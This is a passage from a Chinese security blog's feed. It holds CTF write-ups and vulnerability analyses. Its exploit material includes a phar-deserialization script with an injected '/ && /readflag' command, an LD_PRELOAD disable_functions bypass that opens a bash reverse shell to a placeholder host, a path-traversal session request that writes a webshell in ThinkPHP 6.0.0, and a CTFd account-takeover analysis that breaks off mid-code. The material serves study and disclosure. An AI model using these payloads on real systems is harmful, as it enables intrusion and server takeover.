&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Listfile</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file=$file;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">listdir</span><span class="params">()</span></span>&#123;</span><br><span class="line">        system(<span class="string">"ls "</span>.<span class="keyword">$this</span>-&gt;file).<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($name, $arguments)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        system(<span class="string">"ls "</span>.<span class="keyword">$this</span>-&gt;file);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//$l = new Listfile("/ &amp;&amp; curl 127.0.0.1:7777");</span></span><br><span class="line">$l = <span class="keyword">new</span> Listfile(<span class="string">"/ &amp;&amp; /readflag"</span>);</span><br><span class="line">$f = <span class="keyword">new</span> Fileupload($l);</span><br><span class="line">$sf = serialize($f);</span><br><span class="line">var_dump($sf);</span><br><span class="line">$b = unserialize($sf);</span><br><span class="line">$p = <span class="keyword">new</span> Phar(<span class="string">'./pp.phar'</span>, <span class="number">0</span>);</span><br><span class="line">$p-&gt;startBuffering();</span><br><span class="line">$p-&gt;setStub(<span class="string">'GIF89a&lt;?php __HALT_COMPILER(); ?&gt;'</span>);</span><br><span class="line">$p-&gt;setMetadata($b);</span><br><span class="line">$p-&gt;addFromString(<span class="string">'test.txt'</span>,<span class="string">'text'</span>);</span><br><span class="line">$p-&gt;stopBuffering();</span><br><span class="line">rename(<span class="string">'pp.phar'</span>, <span class="string">'pp.gif'</span>);</span><br></pre></td></tr></table></figure><p>将生成的伪装成 gif 的 phar 文件上传</p><p>在自己的服务器上伪造一个 mysql 服务端，可以使用 <a href="https://github.com/Gifts/Rogue-MySql-Server/blob/78ebbfcdb6ea986d60fe6dc930c4776f79acaf9a/rogue_mysql_server.py#L41" target="_blank" rel="noopener">https://github.com/Gifts/Rogue-MySql-Server/blob/78ebbfcdb6ea986d60fe6dc930c4776f79acaf9a/rogue_mysql_server.py#L41</a> 这个脚本</p><p>修改其 filelist 中的文件名为 phar 协议</p><p>phar://uploads/15844deb09884fccfd98166aa2c11990/1d00be8e06978e935acb75ad6caad48c.gif/test.txt</p><p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/GYCTF-2020-WriteUp.assets/image-20200309005549996.png" alt="image-20200309005549996"></p><p>服务器启动脚本，本地访问题目测试mysql服务器即可触发</p><p>本题 mysqli 的 options 设置的挺坑，要求 int，而网上一些文章都是直接填 <code>MYSQLI_OPT_LOCAL_INFILE</code> ，简直是误导，而且这个就算爆出 PHP Warning，某些环境下还是可以使用 <em>LOAD LOCAL INFILE</em> 语句的，应该和其他配置有关</p><p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/GYCTF-2020-WriteUp.assets/image-20200309010103319.png" alt="image-20200309010103319"></p><p><code>MYSQLI_OPT_LOCAL_INFILE</code>  值为 8，所以本地 option 传入值为 int 8 </p><p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/GYCTF-2020-WriteUp.assets/image-20200309005048908.png" alt="image-20200309005048908"></p><p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/GYCTF-2020-WriteUp.assets/image-20200309005358162.png" alt="image-20200309005358162"></p><p>flag：<code>flag{bfa7ea9865f08c320abab5323a1b522c1}</code></p><hr><p><a href="http://phoebe233.cn/index.php/archives/27/" target="_blank" rel="noopener">http://phoebe233.cn/index.php/archives/27/</a></p><p><a href="https://blog.csdn.net/nzjdsds/article/details/82461112" target="_blank" rel="noopener">https://blog.csdn.net/nzjdsds/article/details/82461112</a></p><p><a href="http://www.pdsdt.lovepdsdt.com/index.php/2020/03/09/187/" target="_blank" rel="noopener">http://www.pdsdt.lovepdsdt.com/index.php/2020/03/09/187/</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;点击阅读&lt;/p&gt;
    
    </summary>
    
    
      <category term="WriteUp" scheme="http://j0k3r.top/tags/WriteUp/"/>
    
      <category term="CTF" scheme="http://j0k3r.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>i春秋新春战役公益赛-出题记录</title>
    <link href="http://j0k3r.top/2020/03/03/challenge-for-nCoV/"/>
    <id>http://j0k3r.top/2020/03/03/challenge-for-nCoV/</id>
    <published>2020-03-02T16:00:00.000Z</published>
    <updated>2020-03-26T10:19:18.767Z</updated>
    
    <content type="html"><![CDATA[<p>点击阅读</p><a id="more"></a><h2 id="i春秋新春战役公益赛-出题记录"><a href="#i春秋新春战役公益赛-出题记录" class="headerlink" title="i春秋新春战役公益赛-出题记录"></a>i春秋新春战役公益赛-出题记录</h2><p>本次比赛也是有幸出了一个 Web 题目——easy_thinking，题目本身并不难，最后做出来的人也不少，本来以为是动态 Docker 下发的题目，结果不是，结束后看过一些网上师傅们的思路发现可以直接骑别人的马拿 flag，emmmm</p><p>大部分都是通过 <a href="https://bugs.php.net/bug.php?id=72530" target="_blank" rel="noopener">Use After Free in GC with Certain Destructors</a> 这个 php7.0 到 php7.3 的 bug 来打的，本意其实是希望使用 gnupg 这个模块</p><h3 id="WriteUp"><a href="#WriteUp" class="headerlink" title="WriteUp"></a>WriteUp</h3><p>URL 简单测试下报错，发现是 <a href="http://www.thinkphp.cn/" target="_blank" rel="noopener">ThinkPHP</a> V6.0.0</p><p>Web 目录扫描，拿到源码，简单审计下</p><p>看下应用代码，发现 session 使用方法不合理，会将部分搜索关键字保存在 session 中，即存在任意文件操作漏洞 ，可以利用这点写入 php 文件，具体分析可参考网络文章</p><p>先注册一个账号，在登录时设置一个 32 位长度的 PHPSESSID 作为文件名</p><p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/challenge-for-nCoV.assets/image-20200209161407850.png" alt="image-20200209161407850"></p><p>在搜索处写入 php 代码，得到 /runtime/session/sess_c465f41ee715df8c726dcc4742a6.php，antsword 连接，发现无法执行终端命令</p><p>查看 phpinfo 后发现 disable_functions </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">passthru,mail,error_log,mb_send_mail,imap_mail,exec,system,chroot,chgrp,chown,shell_exec,popen,proc_open,pcntl_exec,ini_alter,ini_restore,dl,openlog,syslog,readlink,symlink,popepassthru,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,imap_open,apache_setenv</span><br></pre></td></tr></table></figure><p>使用 LD_PRELOAD 绕过，虽然限制了很多常用来 bypass 的函数，但是在 phpinfo 信息中注意到有个不常见的 gnupg 模块，推测可以利用</p><p>本地测试可以发现使用 gnupg 拓展下的 gnupg_init() 函数 可以进行 bypass</p><p>先本地生成 exp.so， <code>gcc --share -fPIC exp.c -o exp.so</code></p><p>antsword 上传文件到 /tmp/exp.so</p><p>写入以下 php 文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> putenv(<span class="string">"cmd=/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/host/port 0&gt;&amp;1'"</span>);putenv(<span class="string">"LD_PRELOAD=/tmp/exp.so"</span>);gnupg_init();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/challenge-for-nCoV.assets/image-20200209014404973.png" alt="image-20200209014404973"></p><p>反弹 shell，执行 /readflag 读取 flag 文件</p><p>get flag</p><p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/challenge-for-nCoV.assets/image-20200209020945561.png" alt="image-20200209020945561"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;点击阅读&lt;/p&gt;
    
    </summary>
    
    
      <category term="WriteUp" scheme="http://j0k3r.top/tags/WriteUp/"/>
    
      <category term="CTF" scheme="http://j0k3r.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>ThinkPHP v6.0.0~6.0.1 任意文件操作漏洞分析</title>
    <link href="http://j0k3r.top/2020/03/02/ThinkPHP_v6.0.0_ArbitraryFileWriting/"/>
    <id>http://j0k3r.top/2020/03/02/ThinkPHP_v6.0.0_ArbitraryFileWriting/</id>
    <published>2020-03-01T16:00:00.000Z</published>
    <updated>2020-03-26T10:18:40.919Z</updated>
    
    <content type="html"><![CDATA[<p>点击阅读</p><a id="more"></a><h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>影响版本：ThinkPHP 6.0.0 ～ThinkPHP 6.0.1</p><p>漏洞危害：任意文件操作，getshell</p><p>官方补丁：<a href="https://github.com/top-think/framework/commit/1bbe75019ce6c8e0101a6ef73706217e406439f2" target="_blank" rel="noopener">https://github.com/top-think/framework/commit/1bbe75019ce6c8e0101a6ef73706217e406439f2</a></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="1-搭建环境"><a href="#1-搭建环境" class="headerlink" title="1. 搭建环境"></a>1. 搭建环境</h3><p>安装漏洞版本的 ThinkPHP</p><p>测试使用 <code>composer create-project topthink/think=6.0.0 tp6.0.0</code> 命令安装的时候会自动安装 6.0.2 版本的 framework</p><p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/ThinkPHP_v6.0.0_ArbitraryFileWriting.assets/image-20200205201723699.png" alt="image-20200205201723699"></p><p>可以使用 <code>composer create-project topthink/framework=6.0.0 tpframework</code> 命令下载指定版本的 framework，再替换过去即可</p><p>下载若出现  SSL: Handshake timed out 错误的可以尝试换源并在 php.ini 中重新设置超时时间</p><p><code>composer config -g repo.packagist composer https://packagist.phpcomposer.com</code></p><p><code>default_socket_timeout = 360</code></p><h3 id="2-复现"><a href="#2-复现" class="headerlink" title="2. 复现"></a>2. 复现</h3><p>开启 Session，在全局的中间件定义文件中删除 Session 初始化注释</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 全局中间件定义文件</span></span><br><span class="line"><span class="keyword">return</span> [</span><br><span class="line">    <span class="comment">// 全局请求缓存</span></span><br><span class="line">    <span class="comment">// \think\middleware\CheckRequestCache::class,</span></span><br><span class="line">    <span class="comment">// 多语言加载</span></span><br><span class="line">    <span class="comment">// \think\middleware\LoadLangPack::class,</span></span><br><span class="line">    <span class="comment">// Session初始化</span></span><br><span class="line">    \think\middleware\SessionInit::class</span><br><span class="line">];</span><br></pre></td></tr></table></figure><p>自定义一个漏洞方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">vuln</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">$para = Request::get(<span class="string">'para'</span>);</span><br><span class="line">Session::set(<span class="string">'testSession'</span>, $para);</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发送以下请求</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET /index/vuln?para=%3C?php%20phpinfo();?%3E HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:8000</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:72.0) Gecko/20100101 Firefox/72.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: PHPSESSID=/../../../000000000000000000.php</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br></pre></td></tr></table></figure><p>即在 web 根目录生成 000000000000000000.php （如果有写入权限的话）</p><p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/ThinkPHP_v6.0.0_ArbitraryFileWriting.assets/image-20200210233257716.png" alt="image-20200210233257716"></p><h3 id="3-分析"><a href="#3-分析" class="headerlink" title="3. 分析"></a>3. 分析</h3><p>看下官方 github 的 commit </p><p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/ThinkPHP_v6.0.0_ArbitraryFileWriting.assets/image-20200210233456562.png" alt="image-20200210233456562"></p><p>对 <code>$id</code> 使用 <code>ctype_alnum</code> 检测其是否全部为字母和(或)数字字符</p><p>下面我就 debug 跟一下调用看看是如何通过 session 写入文件的</p><p>在开启 Session 初始化的全局中间件之后，ThinkPHP 会调用反射执行类的实例化，加载 \think\middleware\SessionInit</p><p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/ThinkPHP_v6.0.0_ArbitraryFileWriting.assets/image-20200211001948777.png" alt="image-20200211001948777"></p><p>之后通过中间件调度管道，调用 SessionInit 的 handle 类方法进行 session初始化</p><p> <img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/ThinkPHP_v6.0.0_ArbitraryFileWriting.assets/image-20200211002520475.png" alt="image-20200211002520475"></p><p>跟进 handle 函数，来到 /vendor/topthink/framework/src/think/middleware/SessionInit.php，首先获取的 <code>$varSessionId</code>值为空，下面跟进  <code>$this-&gt;session-&gt;getName()</code></p><p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/ThinkPHP_v6.0.0_ArbitraryFileWriting.assets/image-20200211020829775.png" alt="image-20200211020829775"></p><p>来到 /vendor/topthink/framework/src/think/session/Store.php，Store 类构造函数会调用其 setId 方法，来到漏洞代码处，但此时为 Store 类的初始化阶段，并没有 id 参数传入</p><p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/ThinkPHP_v6.0.0_ArbitraryFileWriting.assets/image-20200211001311794.png" alt="image-20200211001311794"></p><p>接着通过 Store 类的 getName 方法获取 sessionName，之后会赋值给 <code>$cookieName</code></p><p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/ThinkPHP_v6.0.0_ArbitraryFileWriting.assets/image-20200211004432030.png" alt="image-20200211004432030"></p><p>而 sessionName 的值在 Store 类中定义好了的，即 <code>&quot;PHPSESSID&quot;</code></p><p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/ThinkPHP_v6.0.0_ArbitraryFileWriting.assets/image-20200211004515137.png" alt="image-20200211004515137"></p><p>返回到 SessionInit，所以此处的 <code>$cookieName</code> 的值为<code>&quot;PHPSESSID&quot;</code></p><p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/ThinkPHP_v6.0.0_ArbitraryFileWriting.assets/image-20200211004610180.png" alt="image-20200211004610180"></p><p>接着往下开始获取 <code>$sessionId</code> ，关键一步出现了，由于 <code>$varSessionId</code> 的值为空，所以 if 判断之后，<code>$sessionId</code> 的值就是名称为 PHPSESSID 的 cookie 值，也是后来写入的文件名，接下来将 <code>$sessionId</code> 直接传入 setId 函数进行判断</p><p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/ThinkPHP_v6.0.0_ArbitraryFileWriting.assets/image-20200211005240955.png" alt="image-20200211005240955"></p><p>又来到<strong>漏洞代码</strong>处，就是在个时候在这里未对 <code>$id</code> 值做除长度之外的限制，从而可以直接写入任意文件 </p><p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/ThinkPHP_v6.0.0_ArbitraryFileWriting.assets/image-20200211022612881.png" alt="image-20200211022612881"></p><p>在上面将 PHPSESSID 的值赋值给 <code>id</code>后一路跟进，再次来到 /vendor/topthink/framework/src/think/session/Store.php，终于开始保存 session 数据，获取 <code>$sessionId</code>，即 PHPSESSID 的值，这里测试使用的是 c465f41ee715df8c726dcc4742a6.php</p><p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/ThinkPHP_v6.0.0_ArbitraryFileWriting.assets/image-20200211011538058.png" alt="image-20200211011538058"></p><p>将 data 序列化之后通过 write 函数将序列化的数据保存在 c465f41ee715df8c726dcc4742a6.php 文件中</p><p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/ThinkPHP_v6.0.0_ArbitraryFileWriting.assets/image-20200211012048948.png" alt="image-20200211012048948"></p><p>跟进 write 函数，在文件名前加上了 <code>sess_</code> 前缀，再调用 writeFile 函数写入</p><p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/ThinkPHP_v6.0.0_ArbitraryFileWriting.assets/image-20200211012359526.png" alt="image-20200211012359526"></p><p>跟进 writeFile，最终 <code>file_put_contents</code> 完成写入</p><p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/ThinkPHP_v6.0.0_ArbitraryFileWriting.assets/image-20200211012532329.png" alt="image-20200211012532329"></p><p>成功写入 WebShell</p><p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/ThinkPHP_v6.0.0_ArbitraryFileWriting.assets/image-20200211013012377.png" alt="image-20200211013012377"></p><p>在 /vendor/topthink/framework/src/think/session/Store.php:254 中不难看出还有个 delete 函数，用于删除 session </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span><span class="params">()</span>: <span class="title">void</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;clearFlashData();</span><br><span class="line"></span><br><span class="line">    $sessionId = <span class="keyword">$this</span>-&gt;getId();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;data)) &#123;</span><br><span class="line">        $data = <span class="keyword">$this</span>-&gt;serialize(<span class="keyword">$this</span>-&gt;data);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;handler-&gt;write($sessionId, $data);    </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;handler-&gt;delete($sessionId);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">$this</span>-&gt;init = <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里我也进行了测试，看能否删掉在 web 根目录下的 000000000000000000.php，跟进 delete，</p><p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/ThinkPHP_v6.0.0_ArbitraryFileWriting.assets/image-20200211024527031.png" alt="image-20200211024527031"></p><p>显然是通过 getFileName 获取文件名后直接进行删除操作了，但是 getFileName 函数会自动对文件名加上 <code>sess_</code> 前缀</p><p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/ThinkPHP_v6.0.0_ArbitraryFileWriting.assets/image-20200211024704834.png" alt="image-20200211024704834"></p><p>这就直接导致在最后 unlink 删除操作之前的 <code>is_file</code> 判断过不了</p><p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/ThinkPHP_v6.0.0_ArbitraryFileWriting.assets/image-20200211024827033.png" alt="image-20200211024827033"></p><p>这也算是比较经典的问题了，因为 php 在读写文件时使用的是 <code>php_stream_open_wrapper_ex</code> 进行流处理，其最后会使用 <code>tsrm_realpath</code> 函数将文件名标准化成一个绝对路径， 通过处理  <code>../</code> 等特殊符号，文件路径中间有不存在的目录时也不会影响，而判断文件存在、重命名、删除文件等操作无需打开文件流，也就不会进行这种处理，导致报错</p><p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/ThinkPHP_v6.0.0_ArbitraryFileWriting.assets/image-20200211025421722.png" alt="image-20200211025421722"></p><h2 id="漏洞总结"><a href="#漏洞总结" class="headerlink" title="漏洞总结"></a>漏洞总结</h2><p>该漏洞主要危害还是文件写入，而文件删除实际测试来看还是比较有限制的，可操作性不强</p><p>v6 版本的 ThinkPHP 较之前版本还是有不少变化的，通过 debug 逐步分析漏洞能更好的捋清漏洞的形成过程，了解新的框架执行流程和开发思想</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://paper.seebug.org/1114/" target="_blank" rel="noopener">https://paper.seebug.org/1114/</a></p><p><a href="http://d1iv3.me/2018/04/15/从PHP源码看PHP文件操作缺陷与利用技巧/" target="_blank" rel="noopener">http://d1iv3.me/2018/04/15/%E4%BB%8EPHP%E6%BA%90%E7%A0%81%E7%9C%8BPHP%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E7%BC%BA%E9%99%B7%E4%B8%8E%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7/</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;点击阅读&lt;/p&gt;
    
    </summary>
    
    
      <category term="漏洞分析" scheme="http://j0k3r.top/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
      <category term="ThinkPHP" scheme="http://j0k3r.top/tags/ThinkPHP/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2020-7245 CTFd 任意账户接管漏洞 分析</title>
    <link href="http://j0k3r.top/2020/03/01/ctfd-CVE-2020-7245/"/>
    <id>http://j0k3r.top/2020/03/01/ctfd-CVE-2020-7245/</id>
    <published>2020-02-29T16:00:00.000Z</published>
    <updated>2020-03-26T10:18:55.369Z</updated>
    
    <content type="html"><![CDATA[<p>影响版本：CTFd v2.0.0 - v2.2.2</p><a id="more"></a><h2 id="0x01-漏洞简介"><a href="#0x01-漏洞简介" class="headerlink" title="0x01 漏洞简介"></a>0x01 漏洞简介</h2><p>影响版本：CTFd v2.0.0 - v2.2.2</p><p>漏洞危害：接管任意帐户 (已知用户名且开启了电子邮件)</p><p>官方补丁：<a href="https://github.com/CTFd/CTFd/pull/1218/files" target="_blank" rel="noopener">https://github.com/CTFd/CTFd/pull/1218/files</a></p><h2 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h2><p>使用 CTFd v2.2.0 版本进行分析，直接本地以 debug 模式运行，在后台开启邮件验证并设置好 smtp 服务器配置信息用于后面发送重置邮件</p><h3 id="1-漏洞复现"><a href="#1-漏洞复现" class="headerlink" title="1. 漏洞复现"></a>1. 漏洞复现</h3><p>注册一个用户名为 targetUser 的用户，将该用户作为目标用户</p><p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/ctfd-CVE-2020-7245.assets/image-20200301203639978.png" alt="image-20200301203639978"></p><p>新注册一个用户，用户名为 target 且用户名头部或者尾部添加空格</p><p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/ctfd-CVE-2020-7245.assets/image-20200301210021213.png" alt="image-20200301210021213"></p><p>通过忘记密码来生成重置链接</p><p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/ctfd-CVE-2020-7245.assets/image-20200301221537528.png" alt="image-20200301221537528"></p><p>访问链接即可重置目标用户的密码接管 target</p><h3 id="2-漏洞分析"><a href="#2-漏洞分析" class="headerlink" title="2. 漏洞分析"></a>2. 漏洞分析</h3><p>当我们再注册新用户的时候 CTFd 通过 /CTFd/auth.py 中的 register 函数进行处理</p><p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/ctfd-CVE-2020-7245.assets/image-20200301204717551.png" alt="image-20200301204717551"></p><p>用户名，也就是代码中的 name 的值是直接从表单中获取的，然后用该 name 值查询数据库中是否有同名用户，如果 names 返回值不为空，则会得到一个用户名已存在的错误</p><p>在往下跟进</p><p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/ctfd-CVE-2020-7245.assets/image-20200301205200682.png" alt="image-20200301205200682"></p><p>在其他如用户名长度、邮箱、密码等检查项没有问题之后，将该注册用户插入到数据库中，这时的 name 经过了 <code>strip()</code> 函数的处理， <code>strip()</code> 也是常用来移除字符串头尾指定字符的函数，默认是去除首尾的空格或换行符，也就是说这里入库前后的 name 是不同的</p><p>那么在用户名头部或者尾部添加若干空格即可绕过有关用户名唯一性的检测，使用该方法新注册一个账号，结果如下</p><p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/ctfd-CVE-2020-7245.assets/image-20200301210021213.png" alt="image-20200301210021213"></p><p>那么只需要重置该用户密码即可接管 targetUser 用户，跟进看下 <code>reset_password</code> 函数，/CTFd/auth.py ，98 行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reset_password</span><span class="params">(data=None)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> data <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            name = unserialize(data, max_age=<span class="number">1800</span>)</span><br><span class="line">        <span class="keyword">except</span> (BadTimeSignature, SignatureExpired):</span><br><span class="line">            <span class="keyword">return</span> render_template(</span><br><span class="line">                <span class="string">"reset_password.html"</span>, errors=[<span class="string">"Your link has expired"</span>]</span><br><span class="line">            )</span><br><span class="line">        <span class="keyword">except</span> (BadSignature, TypeError, base64.binascii.Error):</span><br><span class="line">            <span class="keyword">return</span> render_template(</span><br><span class="line">                <span class="string">"reset_password.html"</span>, errors=[<span class="string">"Your reset token is invalid"</span>]</span><br><span class="line">            )</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> request.method == <span class="string">"GET"</span>:</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">"reset_password.html"</span>, mode=<span class="string">"set"</span>)</span><br><span class="line">        <span class="keyword">if</span> request.method == <span class="string">"POST"</span>:</span><br><span class="line">            user = Users.query.filter_by(name=name).first_or_404()</span><br><span class="line">            user.password = request.form[<span class="string">"password"</span>].strip()</span><br><span class="line">            db.session.commit()</span><br><span class="line">            log(</span><br><span class="line">                <span class="string">"logins"</span>,</span><br><span class="line">                format=<span class="string">"[&#123;date&#125;] &#123;ip&#125; -  successful password reset for &#123;name&#125;"</span>,</span><br><span class="line">                name=name,</span><br><span class="line">            )</span><br><span class="line">            db.session.close()</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">"auth.login"</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">"POST"</span>:</span><br><span class="line">        email_address = request.form[<span class="string">"email"</span>].strip()</span><br><span class="line">        team = 